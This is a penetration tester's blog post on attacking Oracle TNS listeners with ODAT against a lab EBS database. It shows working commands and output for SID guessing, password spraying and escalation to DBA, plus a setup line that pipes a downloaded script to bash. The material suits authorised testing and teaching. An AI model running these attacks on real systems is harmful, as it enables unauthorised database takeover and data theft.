# Oracle TNS Listeners: A Practical Attack Path
In this post, I'll walk through my standard methodology and attack path for testing Oracle Databases via their TNS Listeners. Whether you're encountering these for the first time or looking to refine your approach, I hope you'll find something useful here. This guide focuses on attacking TNS listeners running on Linux systems. While they can run on Windows Servers, I rarely encounter that in practice. This methodology can be used for Windows Servers as well, but file paths, module usages, and other differences will need to be adjusted accordingly.

If you've done internal network testing, you've almost certainly seen Oracle TNS listeners. They're common in Oracle-based environments and come packaged with products like Oracle E-Business Suite (EBS). In these environments, the databases are the crown jewels, holding all the sensitive data you'd want to protect. For offensive security practitioners, they're priority targets for demonstrating impact. Depending on network segmentation, they can also provide pivot points to reach otherwise isolated hosts.

Big shoutout to [@quentinhardy](https://github.com/quentinhardy) for creating [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat), which I use for nearly every step of Oracle database testing.

## Identifying Oracle TNS/Databases
When should you try this methodology? Anytime you find an Oracle TNS listener in scope. If you're using `nmap` or similar tools during engagements, these services are fairly easy to fingerprint.

>In my experience, these don't usually run on the default port 1521, so full port scans are your friend.

Here is an example where a `nmap` scan with the `-sV` flag identifies a TNS listener:
```bash
nmap -sV oraclehost.example.com
# ...SNIP...
PORT     STATE SERVICE    VERSION  
1521/tcp open  oracle-tns Oracle TNS listener 0.0.0.0.0 (unauthorized)
# ...SNIP...
```

## Setting Up ODAT
The primary tool I use for Oracle testing is [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat). Below are the installation steps for Debian-based systems.

> If you're running Python 3.12+, you'll encounter errors from deprecated standard library usage. I recommend using Python 3.11 instead. You can manage Python versions with [pyenv](https://github.com/pyenv/pyenv).

```bash
# Quick setup for pyenv with Python 3.11
sudo apt update && sudo apt install -y build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git
curl https://pyenv.run | bash
# These should go to whatever shell config you are using, i.e .zshrc for zsh, etc.
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init --path)"\nfi' >> ~/.bashrc
exec $SHELL
# Install Python 3.11.14 (latest at time of writing)
pyenv install 3.11.14
# Set version to 3.11.14
pyenv global 3.11.14
# See if that worked:
python3 --version
# Python 3.11.14

# To revert back to your system version:
pyenv global system
```

> ODAT installation commands:

```bash
# ODAT Dependencies (git, libaio1, alien, oracle tools, python3)
sudo apt install -y git libaio-dev alien oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus python3 python3-venv python3-dev python3-pip
git clone https://github.com/quentinhardy/odat.git
cd odat
python3 -m venv venv
source venv/bin/activate
pip install cx_Oracle scapy colorlog termcolor pycryptodome passlib python-libnmap argcomplete

# Run odat.py help menu, if this works you should be good to proceed.
python3 odat.py --help
```

> If you do not have the oracle client packages in your repository, you can find them here and install the RPMs: https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html

```bash
# Convert RPMs to DEB with alien and install them
sudo alien -i oracle-instantclient-basic.x86_64.rpm
sudo alien -i oracle-instantclient-devel.x86_64.rpm
sudo alien -i oracle-instantclient-sqlplus.x86_64.rpm
```

> One more potential issue to address: the `Cannot locate a 64-bit Oracle Client library: "libaio.so.1"` error. This won't appear until you actually try to run ODAT. The fix is straightforward—find your 64-bit libaio library and either copy or symlink it:

```bash
# Find the version installed
find /usr/lib /lib -name "libaio.so*" 2>/dev/null
# Likely will look something like /usr/lib/x86_64-linux-gnu/libaio.so.1t64

# Symlink it to libaio.so.1:
sudo ln -s /usr/lib/x86_64-linux-gnu/libaio.so.1t64 /usr/lib/x86_64-linux-gnu/libaio.so.1
sudo ldconfig
```

I've covered the main issues I've encountered while installing ODAT. If you run into other errors during setup, Google and ChatGPT are your friends. This tool likely will see few updates in the future, so some manual troubleshooting is expected. There's also a "Troubleshooting" section at the end of this post with a fix for specific connection errors to TNS listeners.

>You can also containerize ODAT if you don't want to deal with dependency setup, though you'll still need to grab the Oracle client packages. See the [Docker Instructions here](https://github.com/quentinhardy/odat/tree/master-python3/Docker).

# Initial Access
## SID/Service Name Identification
The first step in exploiting Oracle TNS listeners is typically gaining access to a user account. However, before you can even attempt username/password combinations, you need to identify a valid `SID` (System Identifier) or `Service Name`. In a fully black-box engagement, you're essentially left guessing. ODAT includes a built-in wordlist for guessing these values (`resources/sids.txt`). In my testing, this wordlist has never yielded a valid name, but your mileage may vary.

The easiest way to start is using ODAT's `all` module. Without specifying credentials or a `SID`/`Service Name`, the tool will attempt to enumerate these for you.

>**NOTE**: The `all` command is aggressive and performs many actions, so I wouldn't recommend running it in production environments without understanding what it does first. It can leave artifacts that require cleanup, which we'll discuss later.

Here is an example run where we don't find a valid `SID` or `Service Name` to continue:

```bash
python3 odat.py all -s 192.168.187.135 -p 1521  
[+] Checking if target 192.168.187.135:1521 is well configured for a connection...  
[+] According to a test, the TNS listener 192.168.187.135:1521 is well configured. Continue...  
  
[1] (192.168.187.135:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?  
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.  
  
[2] (192.168.187.135:1521): Searching valid SIDs  
[2.1] Searching valid SIDs thanks to a well known SID list on the 192.168.187.135:1521 server  
100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
[2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (192.168.187.135:1521)  
100% |#####################################################################################################################################################################################################################################| Time: 00:00:00    
[2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (192.168.187.135:1521)  
100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
[-] No found a valid SID  
  
[3] (192.168.187.135:1521): Searching valid Service Names  
[3.1] Searching valid Service Names thanks to a well known Service Name list on the 192.168.187.135:1521 server  
100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
[3.2] Searching valid Service Names thanks to a brute-force attack on 1 chars now (192.168.187.135:1521)  
100% |#####################################################################################################################################################################################################################################| Time: 00:00:00    
[3.3] Searching valid Service Names thanks to a brute-force attack on 2 chars now (192.168.187.135:1521)  
100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
[-] No found a valid Service Name  
[-] No one SID or Service Name has been found. Impossible to continue
```

Typically, admins of these resources will have a specific naming convention for these values, and building a custom wordlist will give you the best possible outcome. Building the wordlist can be done with any info you have on the environment. Hostnames or application names are often used as TNS listener `SIDs` and `Service Names`. Trying `hostname` with random digits up to three (3) values has worked for me before.

Here is an example of running ODAT with a custom wordlist that finds a valid `Service Name` using the `snguesser` module (`sidguesser` is the other module for `SIDs` specifically):

```bash
python3 odat.py snguesser -s 192.168.187.135 -p 1521 --service-name-file custom_services.txt    
  
[1] (192.168.187.135:1521): Searching valid Service Names  
[1.1] Searching valid Service Names thanks to a well known Service Name list on the 192.168.187.135:1521 server  
[+] 'EBSDB' is a valid Service Name. Continue...                                                                                                                                                                                           | ETA:  00:00:01    
100% |#####################################################################################################################################################################################################################################| Time: 00:00:02    
[1.2] Searching valid Service Names thanks to a brute-force attack on 1 chars now (192.168.187.135:1521)  
100% |#####################################################################################################################################################################################################################################| Time: 00:00:00    
[1.3] Searching valid Service Names thanks to a brute-force attack on 2 chars now (192.168.187.135:1521)  
100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
[+] Service Name(s) found on the 192.168.187.135:1521 server: EBSDB
```

The more information you can uncover via recon, the better chance of successfully uncovering the `SID` or `Service Name`. What has worked best for me would be searching any open SMB shares in the environment, or if you have access to it, searching SharePoint regarding the host in question. DBAs often have documentation lying around (usually not secured well by ACLs) which may even have user credentials in them. If you are lucky, you might just find a DBA level account lying around in an unprotected SMB share, at which point you have already won (similar to getting domain admin 5 minutes after starting AD testing).

## Getting User Access
Once you have a valid `SID` or `Service Name`, you can move on to attempting to log in as a database user. If you did not find any usernames or potential credential pairs in your previous recon, I would run ODAT's `passwordguesser` module to see if any accounts have default values.

>I would not recommend attempting more than two (2) passwords on each account to avoid account lockout. This can be configured differently for any given TNS listener, but it would be safe to assume it is set to three (3) attempts at most aggressive.

Here is an example running with the built-in account wordlist:

```bash
python3 odat.py passwordguesser -s 192.168.187.135 -p 1521 -n EBSDB  
  
[1] (192.168.187.135:1521): Searching valid accounts on the 192.168.187.135 server, port 1521  
[!] Notice: 'ad_monitor' account is locked, so skipping this username for password                                                                                                                                                         | ETA:  00:07:41    
[!] Notice: 'anonymous' account is locked, so skipping this username for password                                                                                                                                                          | ETA:  00:07:58    
[+] Valid credentials found: applsyspub/pub. Continue...                                                                                                                                                                                   | ETA:  00:07:44    
[+] Valid credentials found: apps/apps. Continue...                
[+] Valid credentials found: apps_ne/apps. Continue...             
The login cis has already been tested at least once. What do you want to do:                                                                                                                                                               | ETA:  00:07:25    
- stop (s/S)  
- continue and ask every time (a/A)  
- skip and continue to ask (p/P)  
- continue without to ask (c/C)  
s  
100% |#####################################################################################################################################################################################################################################| Time: 00:01:13    
[+] Accounts found on 192.168.187.135:1521/ServiceName:EBSDB:    
applsyspub/pub  
apps/apps  
apps_ne/apps
```

In my environment (which is a test Oracle EBS system), we see some defaults are in use and found. If this were a real environment the `apps` account is pretty much game over for all EBS specific data. However, as a hardening technique, these accounts are often not allowed to create remote database connections. Let's assume we cannot connect with these accounts remotely and move on to a targeted spray.

As seen above, something widespread in these Oracle environments is accounts having their username as their password. Why this was ever a standard... don't ask me. If you find usernames, I would first spray them with their usernames as their passwords and see if any of those work. If that doesn't, you are left with guessing. Common passwords can be environment-specific, but in Oracle environments I find that `Welcome1` is widely used and would be my first guess.

>Case sensitivity is not always enabled in Oracle TNS listeners either. Keep that in mind for password spraying and password cracking (later).

Target spray with a custom list:

```bash
python3 odat.py passwordguesser -s 192.168.187.135 -p 1521 -n EBSDB --accounts-file custom_accounts.txt    
  
[1] (192.168.187.135:1521): Searching valid accounts on the 192.168.187.135 server, port 1521  
[+] Valid credentials found: STEPHEN_ADAMS/STEPHEN_ADAMS. Continue...                                                           ######################################                                                                     | ETA:  00:00:19    
[!] Notice: 'xdb' account is locked, so skipping this username for password#####################################################################################################                                                           | ETA:  00:00:16    
100% |#####################################################################################################################################################################################################################################| Time: 00:01:05    
[+] Accounts found on 192.168.187.135:1521/ServiceName:EBSDB:    
STEPHEN_ADAMS/STEPHEN_ADAMS
```

With a valid user credential in hand, you can move onto the juicy stuff. In my experience, once you have a valid credential, you have a great opportunity to turn initial access into a full database compromise.

## Mapping Out the Database
With the user credential in hand, you can now connect and take a look around. Any SQL client such as `sqlplus` can be used to do that and interact with SQL. I am going to stick to showing mostly ODAT functionality here to make things quicker.

### Database Information Gathering
ODAT has a `search` module which can be used to get info about the database you are connected to. This is very helpful to run on your first compromised user to get several items, such as password lockout policy, case sensitivity policy, all usernames, and much more.

Here is an example of running the `search` module to fetch the basic info:

```bash
python3 odat.py search -s 192.168.187.135 -p 1521 -n EBSDB -U STEPHEN_ADAMS -P STEPHEN_ADAMS --basic-info  
  
[1] (192.168.187.135:1521): Test if the Search module can be used  
  
  
--> System date: 2025-11-25 06:53:25.825942  
--> Version(s): Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production  
--> Instance host name: apps  
--> IP address: 192.168.187.134  
--> Name of the database - db_name: EBSDB  
--> Name of the database - db_unique_name: EBSCDB  
--> Instance name: EBSCDB  
--> Service Name (session): ebsdb
--> Oracle Database Vault is enabled: FALSE  
--> JAVA is enabled: TRUE  
--> Audit is enabled for SYSDBA or SYSOPER: FALSE  
--> Basic audit features level: NONE  
--> Case-sensitivity is required for passwords: FALSE  
--> Maximum failed login attemps (connection): 3
# ...SNIP...
--> Current user's privileges (via USER_SYS_PRIVS & no recursion on roles):  
 USERNAME            PRIVILEGE         ADMIN_OPTION   COMMON   INHERITED    
=========================================================================  
STEPHEN_ADAMS   CREATE SESSION          NO             NO       NO           
PUBLIC          TEXT DATASTORE ACCESS   NO             NO       NO           
  
--> Current user's roles:  
USERNAME   GRANTED_ROLE   ADMIN_OPTION   DELEGATE_OPTION   DEFAULT_ROLE   OS_GRANTED   COMMON   INHERITED    
=========================================================================================================  
  
--> Databases:  
OWNER     
======  
SYS       
SYSTEM    
MGDSYS    
CTXSYS    
MDSYS     
EUL_US    
XDB       
  
--> All visible Users:  
      USERNAME           
======================  
SYS                       
SYSTEM                    
OUTLN                     
DIP                       
XDB                       
ORACLE_OCM                
DBSNMP                    
APPQOSSYS                 
XS$NULL                   
ANONYMOUS                 
ORDSYS                    
ORDDATA                   
ORDPLUGINS                
SI_INFORMTN_SCHEMA        
MDSYS                     
MDDATA                    
INV                       
OLAPSYS
# ...SNIP...
--> Database options and features:  
             PARAMETER                 VALUE    
=============================================  
Partitioning                            TRUE     
Objects                                 TRUE     
Real Application Clusters               FALSE    
Advanced replication                    TRUE     
Bit-mapped indexes                      TRUE     
Connection multiplexing                 TRUE     
Connection pooling                      TRUE     
Database queuing                        TRUE
# ...SNIP...
Centrally Managed User                  TRUE     
17:53:27 WARNING -: Error with the SQL request SELECT * FROM DBA_REGISTRY: `ORA-00942: table or view does not exist`  
--> Components loaded into the database: unknown  
17:53:27 WARNING -: Error with the SQL request select * from dba_registry_sqlpatch: `ORA-00942: table or view does not exist`  
--> SQL patches installed (>= 12c): unknown  
17:53:27 WARNING -: Error with the SQL request SELECT dbms_qopatch.GET_OPATCH_LIST FROM dual: `ORA-00904: "DBMS_QOPATCH"."GET_OPATCH_LIST": invalid identifier`  
--> SQL patches installed with DBMS_QOPATCH (>= 12c): unknown  
17:53:27 WARNING -: Error with the SQL request select * from sys.registry$history: `ORA-00942: table or view does not exist`  
--> SQL patches installed (== 11g): unknown
```

It is worth noting that several of these SQL queries may error out depending on what access your account has. The above was run from a user who just has `CREATE SESSION` privileges, so I cannot see things like patch versions.
### Enumerating User Privileges
The first thing I usually do when I compromise a user is see what actions they can perform. The `--get-detailed-privs` flag will recurse through roles assigned, so I would recommend using that.

An example run with a low-privilege user:
```bash
python3 odat.py privesc -s 192.168.187.135 -p 1521 -n EBSDB -U STEPHEN_ADAMS -P STEPHEN_ADAMS --get-detailed-privs  
  
[1] (192.168.187.135:1521): Get system privileges and roles of current Oracle user + roles and privileges of roles granted to this current user  
- system privege: CREATE SESSION  
- system privege: TEXT DATASTORE ACCESS
```

If there was an exploitable permission, it would show up highlighted in green with an arrow saying `exploitable`. We will take a look at that later. Even for privileges that don't result in straight-up privilege escalation, you still want to keep your eyes peeled for things such as `SELECT ANY TABLE` or specifically things that allow `ANY`. That will allow you to read outside your specific schema (namespace).

### Spraying Username as Password
As mentioned prior, we now have the full list of database users. It is definitely worth running the username like password module to see if any accounts also have their username as their password. I cannot tell you how many times this has resulted in landing an account that had dangerous permissions allowing me to privilege escalate further towards DBA or system command execution.

>Pay attention to whether the DB requires case sensitivity for passwords. If that is set to false, then you can try uppercase, for example, rather than trying both upper and lowercase. You would create your own wordlist in this case and use the `passwordguesser` module. A lot of times I just use the `passwordguesser` module over `userlikepwd`to better control of how many attempts are made.

Here is an example run of username like password that finds a `CUSTOM_DBA` user:
```bash
python3 odat.py userlikepwd -s 192.168.187.135 -p 1521 -n EBSDB -U STEPHEN_ADAMS -P STEPHEN_ADAMS --run  
  
[1] (192.168.187.135:1521): Oracle users have not the password identical to the username ?  
The login SYS has already been tested at least once. What do you want to do:                                                                                                                                                               | ETA:  --:--:--    
- stop (s/S)  
- continue and ask every time (a/A)  
- skip and continue to ask (p/P)  
- continue without to ask (c/C)  
c
[!] Notice: 'APPQOSSYS' account is locked, so skipping this username for password  
[!] Notice: 'XS$NULL' account is locked, so skipping this username for password  
# ...SNIP...
100% |#####################################################################################################################################################################################################################################| Time: 00:05:59    
[+] Accounts found on 192.168.187.135:1521/ServiceName:EBSDB with usernameLikePassword module:    
APPS/apps  
RECON/recon  
STEPHEN_ADAMS/stephen_adams  
CUSTOM_DBA/custom_dba
```

Now we have some new accounts to go explore.

### Enumerating Dangerous Functionality Access
The next step I usually go for is running the ODAT `all` module authenticated. This will showcase what dangerous functionalities we can use for further exploitation. However, I want to talk really quickly about some things you should know about this command. By default, it will run a username as password spray every time you run it, which for me is not really what I want it to do at this stage of the engagement. It will also leave artifacts in the database, as it does not completely clean up after itself. This is worth noting especially for production environments, where you don't want to be leaving test artifacts everywhere (especially dangerous ones).

I personally comment out the code in ODAT that runs the username as password spray during the authenticated module run. You can do this as well if you like, it is located in the `odat.py` file at both line 329 and 336 for SID and Service Name `all` runs respectively. You can comment out the function call to `runUsernameLikePassword(args)`:

```python
	#C)ALL OTHERS MODULES
	for aSid in list(connectionInformationSID.keys()):
		for loginAndPass in connectionInformationSID[aSid]:
			status = runAllAuthenticatedModules(args=args, username=loginAndPass[0], password=loginAndPass[1], sid=aSid, serviceName=None)
			# usernamelikepassword module
			args['run'] = True
			logging.info("Using last valid credentials on {0} for getting usernames and checking weak passwords".format(getSIDorServiceNameWithType(args)))
			# Added comment to function call below
			# runUsernameLikePassword(args)
	for aServiceName in list(connectionInformationServiceName.keys()):
		for loginAndPass in connectionInformationServiceName[aServiceName]:
			status = runAllAuthenticatedModules(args=args, username=loginAndPass[0], password=loginAndPass[1], sid=None, serviceName=aServiceName)
			# usernamelikepassword module
			args['run'] = True
			logging.info("Using last valid credentials on {0} for getting usernames and checking weak passwords".format(getSIDorServiceNameWithType(args)))
			# Added comment to function call below
			# runUsernameLikePassword(args)
	return True
```

Let's now run the `all` module as the `STEPHENS_ADAMS` user:

```bash
python3 odat.py all -s 192.168.187.135 -p 1521 -n EBSDB -U STEPHEN_ADAMS -P STEPHEN_ADAMS  
[+] Checking if target 192.168.187.135:1521 is well configured for a connection...  
[+] According to a test, the TNS listener 192.168.187.135:1521 is well configured. Continue...  
  
[1] (192.168.187.135:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?  
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.  
  
[2] (192.168.187.135:1521): Testing all authenticated modules on ServiceName:EBSDB with the STEPHEN_ADAMS/STEPHEN_ADAMS account  
[2.1] UTL_HTTP library ?  
[-] KO  
[2.2] HTTPURITYPE library ?  
18:17:34 WARNING -: Impossible to fetch all the rows of the query select httpuritype('http://0.0.0.0/').getclob() from dual: `ORA-29273: HTTP request failed ORA-06512: at "SYS.HTTPURITYPE", line 38 ORA-24247: network access denied by access control lis  
t (ACL) ORA-06512: at "SYS.UTL_HTTP", line 380 ORA-06512: at "SYS.UTL_HTTP", line 1148 ORA-06512: at "SYS.HTTPURITYPE", line 23`  
[-] KO  
[2.3] UTL_FILE library ?  
[-] KO  
[2.4] JAVA library ?  
[-] KO  
[2.5] DBMSADVISOR library ?  
[-] KO  
[2.6] DBMSSCHEDULER library ?  
[-] KO  
[2.7] CTXSYS library ?  
[-] KO  
[2.8] Hashed Oracle passwords ?  
[-] KO  
[2.9] Hashed Oracle passwords with a view in ORACLE_OCM?  
[-] KO  
[-] KO  
[2.10] Hashed Oracle passwords from history?  
[-] KO  
[2.11] DBMS_XSLPROCESSOR library ?  
[-] KO  
[2.12] External table to read files ?  
[-] KO  
[2.13] External table to execute system commands ?  
[-] KO  
[2.14] Oradbg ?  
[-] KO  
[2.15] DBMS_LOB to read files ?  
[-] KO  
[2.16] SMB authentication capture ?  
[-] KO  
[2.17] Gain elevated access (privilege escalation)?  
[2.17.1] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?  
[-] KO  
[2.17.2] Modification of users' passwords using CREATE ANY PROCEDURE privilege only?  
[-] KO  
[2.17.3] DBA role using CREATE ANY TRIGGER privilege?  
[-] KO  
[2.17.4] DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?  
[-] KO  
[2.17.5] DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?  
[-] KO  
[2.18] Modify any table while/when he can select it only normally (CVE-2014-4237)?  
[-] KO  
[2.19] Create file on target (CVE-2018-3004)?  
[-] KO  
[2.20] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?  
[+] Impossible to know if the database is vulnreable to the CVE-2012-3137. You need to run this as root because it needs to sniff authentications to the database
```

So we have a bunch of `[-] KO` here, meaning no useful access to anything dangerous. I find in real environments, you will have access to at least some of these. It is pretty common to see access to things such as the `UTL_FILE` library which allows reading and writing files to the operating system, or DBMS Scheduler access which can allow remote command execution. The latter I see hardened more often set to run as the `nobody` user, but you might get fortunate there.

>This run does not leave database artifacts left over as this user was not able to do any of the attacks.

### Pivoting to Other Users
In this section, I assume we either have compromised many users, or you already found a more permissive heavy user. I will showcase a user that has some dangerous privileges and what the ODAT `all` module looks like here.

I recommend tracking what the account you have compromised "looks like" before running ODAT's `all` module, that way you can see if any artifacts are left over. I am using a [JetBrains IDE](https://www.jetbrains.com/datagrip/) to connect in these below screenshot examples, but you can use any tool you like. If I look at the `CUSTOM_DBA` user before running, they have nothing created in their namespace (it is a freshly created account after all):

![Database View](../images/oracle-databases1.png)

Let's run ODAT `all` as the `CUSTOM_DBA` user and see what we get back:
```bash
python3 odat.py all -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA  
[+] Checking if target 192.168.187.135:1521 is well configured for a connection...  
[+] According to a test, the TNS listener 192.168.187.135:1521 is well configured. Continue...  
  
[1] (192.168.187.135:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?  
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.  
  
[2] (192.168.187.135:1521): Testing all authenticated modules on ServiceName:EBSDB with the CUSTOM_DBA/CUSTOM_DBA account  
[2.1] UTL_HTTP library ?  
[-] KO  
[2.2] HTTPURITYPE library ?  
18:38:41 WARNING -: Impossible to fetch all the rows of the query select httpuritype('http://0.0.0.0/').getclob() from dual: `ORA-29273: HTTP request failed ORA-06512: at "SYS.HTTPURITYPE", line 38 ORA-24247: network access denied by access control lis  
t (ACL) ORA-06512: at "SYS.UTL_HTTP", line 380 ORA-06512: at "SYS.UTL_HTTP", line 1148 ORA-06512: at "SYS.HTTPURITYPE", line 23`  
[-] KO  
[2.3] UTL_FILE library ?  
[-] KO  
[2.4] JAVA library ?  
[+] OK  
[2.5] Bypass built in Oracle JVM security (CVE-2018-3004)?  
[-] KO  
[2.6] DBMSADVISOR library ?  
[-] KO  
[2.7] DBMSSCHEDULER library ?  
[-] KO  
[2.8] CTXSYS library ?  
[-] KO  
[2.9] Hashed Oracle passwords ?  
[-] KO  
[2.10] Hashed Oracle passwords with a view in ORACLE_OCM?  
18:38:42 ERROR -: Impossible to drop view in oracle_ocm: `ORA-00942: table or view does not exist`  
[-] KO  
[-] KO  
[2.11] Hashed Oracle passwords from history?  
[-] KO  
[2.12] DBMS_XSLPROCESSOR library ?  
[-] KO  
[2.13] External table to read files ?  
[-] KO  
[2.14] External table to execute system commands ?  
[-] KO  
[2.15] Oradbg ?  
[-] KO  
[2.16] DBMS_LOB to read files ?  
[-] KO  
[2.17] SMB authentication capture ?  
[-] KO  
[2.18] Gain elevated access (privilege escalation)?  
[2.18.1] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?  
[+] OK  
[2.18.2] Modification of users' passwords using CREATE ANY PROCEDURE privilege only?  
[-] KO  
[2.18.3] DBA role using CREATE ANY TRIGGER privilege?  
[-] KO  
[2.18.4] DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?  
[-] KO  
[2.18.5] DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?  
[-] KO  
[2.19] Modify any table while/when he can select it only normally (CVE-2014-4237)?  
[-] KO  
[2.20] Create file on target (CVE-2018-3004)?  
[-] KO  
[2.21] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?  
[+] Impossible to know if the database is vulnreable to the CVE-2012-3137. You need to run this as root because it needs to sniff authentications to the database
```

Okay, so we have access to the `JAVA` library and can also privilege escalate to the built-in role `DBA` using `CREATE/EXECUTE ANY PROCEDURE`. A quick side note is this user's privileges look like this when running the `privesc` module with the `--get-detailed-privs` flag:

```bash
python3 odat.py privesc -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA --get-detailed-privs  
  
[1] (192.168.187.135:1521): Get system privileges and roles of current Oracle user + roles and privileges of roles granted to this current user  
- system privege: CREATE SESSION  
- system privege: TEXT DATASTORE ACCESS  
- role: CUSTOMDBA  
       - system privege: CREATE ANY PROCEDURE   <-- exploitable  
       - system privege: EXECUTE ANY PROCEDURE
```

>This is an example account configured with this access on purpose; usually a user named or provisioned like this would have more privileges assigned.

Let's see if any artifacts were leftover from running the `all` module:

![Database Artifacts](../images/oracle-databases2.png)

We can see three (3) leftover procedures. The two (2) `EXPLOIT` procedures have to do with confirming `JAVA` access, and the `GET_DBA_CREATE_ANY_INDEX` is testing privilege escalation to `DBA` via that privilege. I have also seen leftover created tables before, but again, it depends on what modules actually work. Be diligent in tracking what is leftover to ensure you can clean it up or document it being left over. This is a major part in understanding what your tools are actually doing, that way you can confirm what was your testing vs. something else (potential incident).

Since these live in our namespace, we can drop them accordingly:

![Drop Artifacts](../images/oracle-databases3.png)

These can probably be easily fixed in the actual ODAT code, but with it being an inactive project for quite some time, I don't think PRs are being reviewed. Anyway, enough on the artifacts, let's move on to exploitation with these libraries.


# Exploitation
I have yet to actually drop the [ODAT wiki](https://github.com/quentinhardy/odat/wiki), which is extremely helpful for understanding what the `all` module checks for and how to use the other modules. I find that it is especially helpful when reviewing which modules you can use and what they allow you to do. I am going to go over the most useful ones that come up often in my experience.


## Privilege Escalation to DBA
This one doesn't always come first, but if you have access to an account that can, it is pretty much game over. Once acquiring `DBA` privileges, you essentially have compromised the database. I will showcase how throughout the rest of this post.

The `privesc` module is the one to use for this, and there are several privilege combos that you can abuse to become `DBA`. The [wiki](https://github.com/quentinhardy/odat/wiki/privesc) goes over them all, but we are going to go over the `CREATE ANY PROCEDUERE` and `EXECUTE ANY PROCEDURE` combo as seen before as privileges granted to the `CUSTOM_DBA` account we have compromised. The first step is to run the `privesc` module with the appropriate flags that you want to try escalating with, in our case we are running `--dba-with-execute-any-procedure`:

```bash
python3 odat.py privesc -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA -v --dba-with-execute-any-procedure  
06:28:31 INFO -: CX_Oracle is well configured according to parameters  
06:28:31 INFO -: OS version from getDatabasePlatfromName(): Linux x86 64-bit  
  
[1] (192.168.187.135:1521): Grant DBA role to current user with CREATE/EXECUTE ANY PROCEDURE method  
06:28:31 INFO -: Trying to give the DBA role to CUSTOM_DBA using CREATE/EXECUTE ANY PROCEDURE method  
06:28:31 INFO -: Trying to create the stored procedure system.odatstoredproc for executing the request ''GRANT dba TO CUSTOM_DBA''  
06:28:31 INFO -: Trying to execute the stored procedure 'system.odatstoredproc'  
06:28:31 INFO -: Trying to drop the stored procedure 'system.odatstoredproc'  
06:28:31 INFO -: Impossible to execute the query 'DROP PROCEDURE system.odatstoredproc': 'ORA-01031: insufficient privileges'  
06:28:31 INFO -: Impossible to drop the stored procedure 'system.odatstoredproc': '`ORA-01031: insufficient privileges`'  
[+] The DBA role has been granted to this current user
```

As we can see the `DBA` role was successfully granted to `CUSTOM_DBA`. A keen eye would see that we were not able to delete the procedure we created to privilege escalate. I suggest using the `-v` flag with most commands so you can see exactly what is happening, and if something fails you will be able to track that as an artifact you need to clean up or report was leftover.

>The `-v` flag also provides timestamps which is another invaluable feature for tracking your activity throughout an engagement.

We can confirm that this was successful by running the `privesc` module again with the `--get-detailed-privs` flag to list out all privileges assigned to `CUSTOM_DBA`:

```bash
python3 odat.py privesc -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA --get-detailed-privs  
  
[1] (192.168.187.135:1521): Get system privileges and roles of current Oracle user + roles and privileges of roles granted to this current user  
- system privege: CREATE SESSION  
- system privege: TEXT DATASTORE ACCESS  
- system privege: UNLIMITED TABLESPACE  
- role: CUSTOMDBA  
       - system privege: ADMINISTER ANY SQL TUNING SET  
       - system privege: ADMINISTER DATABASE TRIGGER  
       - system privege: ADMINISTER RESOURCE MANAGER  
       - system privege: ADMINISTER SQL MANAGEMENT OBJECT  
       - system privege: ADMINISTER SQL TUNING SET  
       - system privege: ADVISOR  
       - system privege: ALTER ANY ANALYTIC VIEW  
       - system privege: ALTER ANY ASSEMBLY  
       - system privege: ALTER ANY ATTRIBUTE DIMENSION
# ...SNIP...
       - role: XDBADMIN  
       - role: XDB_SET_INVOKER  
- role: DBA  
       - system privege: ADMINISTER ANY SQL TUNING SET  
       - system privege: ADMINISTER DATABASE TRIGGER  
       - system privege: ADMINISTER RESOURCE MANAGER  
       - system privege: ADMINISTER SQL MANAGEMENT OBJECT  
       - system privege: ADMINISTER SQL TUNING SET  
       - system privege: ADVISOR
# ...SNIP...
       - role: XDBADMIN  
       - role: XDB_SET_INVOKER
```

We see way more permissions now, including the newly assigned `DBA` role. I usually clean things up as I go in an engagement (unless we want to leave artifacts purposely), so now would be a good time to clean up the leftover `system.odatstoredproc` procedure ODAT created to privilege escalate us:

```sql
[2025-11-27 00:34:43] CUSTOM_DBA> DROP PROCEDURE system.odatstoredproc
[2025-11-27 00:34:44] completed in 38 ms
```

At this point you have mostly full privileges over the database, but that still isn't the full power you would want it to be in some cases. The `DBA` role cannot override things created by the `SYS` account. In non-hardened environments this might be enough to read all tables, including those that have sensitive data. However, in environments where Row-Level Security (RLS) is defined, you usually have to get more creative or become the `SYS` user. Having the `DBA` role will allow you to use dangerous functionalities that can often give you the hash of the `SYS` account, or be able to impersonate them by executing SQL commands locally on the database server (remote command execution).

